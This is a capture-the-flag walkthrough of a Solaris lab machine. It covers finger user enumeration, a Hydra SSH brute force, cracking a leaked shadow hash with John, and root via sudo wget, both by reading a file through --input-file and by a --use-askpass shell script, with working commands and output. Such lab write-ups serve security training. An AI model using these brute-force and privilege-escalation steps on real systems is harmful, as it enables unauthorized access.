## Intro

Tags: #linux #OSCPpath #Solaris #BruteForce #known-binary #easy

---
# Reconnaissance

## Port Scanning

A full TCP port scan reveals several open services. SSH runs on a non-standard port (22022), which a default scan would miss.

```bash
nmap -p- --open -n -Pn -sS -vvv --min-rate 5000 10.10.10.76 -oG allPorts
```

```text
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  http
22022/tcp open  ssh
```

## Service Version Detection

A targeted version scan identifies Solaris as the OS and confirms the finger and SSH services.

```bash
nmap -sCV -p79,111,515,6787,22022 10.10.10.76 -oN targeted
```

```shell
PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  ssl/http Apache httpd
|_http-title: Solaris Dashboard
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
Service Info: OS: Solaris; CPE: cpe:/o:oracle:solaris
```

## Finger Enumeration

The finger service (port 79) allows unauthenticated user enumeration. Use `finger-user-enum` from PentestMonkey with a username wordlist.

```shell
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

```shell
[+] 10.10.10.76: sammy          pts/2        Sep 27 13:55  <host-A>
[+] 10.10.10.76: sunny          pts/3        Apr 24 10:48  <host-B>
```
Both `sunny` and `sammy` are valid local accounts with recent login sessions.

---

# Foothold

## SSH Brute-Force

SSH runs on port 22022. Brute-force `sunny`'s password using Hydra with a common password list.

```bash
hydra -l sunny -P /usr/share/seclists/Passwords/probable-v2-top1575.txt ssh://10.10.10.76 -s 22022
```
#### creds obtained
```shell
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
```

The password is simply `sunday` — the machine name.

## Shell as sunny

Log in as `sunny` using the discovered credentials.

```bash
ssh sunny@10.10.10.76 -p 22022
```

```shell
Oracle Corporation      SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ id
uid=101(sunny) gid=10(staff)
```

### Password Hash Discovery

Enumerate the filesystem and discover a world-readable backup of `/etc/shadow` in the `/backup` directory.

```bash
ls -la /backup/
```

```shell
-rw-r--r-- 1 root root 1024 Jan 1 12:00 shadow.backup
```

```bash
cat /backup/shadow.backup
```

```shell
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

## Cracking Sammy's Hash

Extract `sammy`'s hash and crack it with John the Ripper.
```shell
echo 'sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::' > sammy.hash
john --wordlist=/usr/share/wordlists/rockyou.txt sammy.hash
```
#### creds obtained
```shell
sunday           (sammy)
```

## Shell as Sammy

Switch to `sammy` using the cracked password and grab the user flag.
```bash
su sammy
```

```text
sammy@sunday:~$ cat Desktop/user.txt
a3d94980...
```

---

# Privilege Escalation

## Checking Sudo Privileges

Enumerate `sudo` permissions for `sammy`.

```bash
sudo -l
```

```shell
User sammy may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
```

### Known binary

https://gtfobins.org/gtfobins/wget/
`wget` can be abused in multiple ways to read files or gain a shell. The simplest method is to use `--input-file` to read the root flag directly.
```bash
sudo wget --input-file /root/root.txt
```

```shell
/root/root.txt: Invalid URL fb40fab6...: Unsupported scheme
No URLs found in /root/root.txt.
```
The flag is leaked in the error message.

## Root Shell via Wget

For a full root shell, use `wget`'s `--use-askpass` option to execute a script as root.
```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' > $TF
sudo wget --use-askpass=$TF 0
```

```shell
root@sunday:/home/sammy# id
uid=0(root) gid=0(root)
```
grabbed root flag

---
